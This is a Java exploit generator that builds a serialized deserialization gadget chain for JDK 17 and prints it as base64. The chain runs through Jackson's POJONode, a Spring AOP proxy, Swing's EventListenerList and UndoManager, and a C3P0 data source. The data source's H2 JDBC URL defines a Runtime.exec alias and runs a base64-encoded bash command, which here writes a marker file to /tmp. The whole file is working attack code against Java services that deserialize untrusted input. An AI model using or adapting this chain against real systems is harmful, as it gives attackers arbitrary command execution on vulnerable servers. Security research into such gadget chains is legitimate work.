package gadget.jdk17;

import com.fasterxml.jackson.databind.node.POJONode;
import com.mchange.v2.c3p0.DriverManagerDataSource;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.tomcat.util.http.fileupload.ByteArrayOutputStream;

import org.springframework.aop.framework.AdvisedSupport;


import javax.sql.DataSource;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

//--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED
public class C3P0JDBC {
    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    public static void main(String[] args) throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
        String randowFunctionAlias = getRandomString(4);
        String JDBC_URL = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS "+randowFunctionAlias+" AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}'\\;CALL "+randowFunctionAlias+" ('bash -c {echo,ZWNobyAiamRrMTcgYzNwMCBqZGJjIGhhY2tlZCI+L3RtcC9wd25lZA==}|{base64,-d}|{bash,-i}')";
        driverManagerDataSource.setJdbcUrl(JDBC_URL);
        driverManagerDataSource.setUser("sa");
        driverManagerDataSource.setPassword("123");
        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy(driverManagerDataSource));
        Object serObject = eventListenerList(pojoNode);
        serialize(serObject);
    }
    public static void serialize(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        Base64.Encoder encoder = Base64.getEncoder();
        String evil = encoder.encodeToString(byteArrayOutputStream.toByteArray()).toString();
        System.out.println(evil);
    }
    public static Object eventListenerList(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Field edits =  getFuckField(manager.getClass(), "edits"); //oops cause the edits Field in UndoManager.superClass

        Vector vector = new Vector<>();
        vector.add(obj);

        edits.setAccessible(true);
        edits.set(manager, vector);
        setFieldValue(list, "listenerList", new Object[]{Class.class, manager});
        return list;
    }
    public static Object makeTemplatesImplAopProxy(Object object) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(object);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
        return proxy;
    }
    public static Field getFuckField(Class<?> clazz, String fieldName) {
        Field declaredField;
//        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField;
            } catch (Exception e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }
    public static void setFieldValue(Object obj1,String str,Object obj2) throws NoSuchFieldException, IllegalAccessException {
        Field field2 = obj1.getClass().getDeclaredField(str);//获取PriorityQueue的comparator字段
        field2.setAccessible(true);//暴力反射
        field2.set(obj1, obj2);//设置queue的comparator字段值为comparator
    }
}

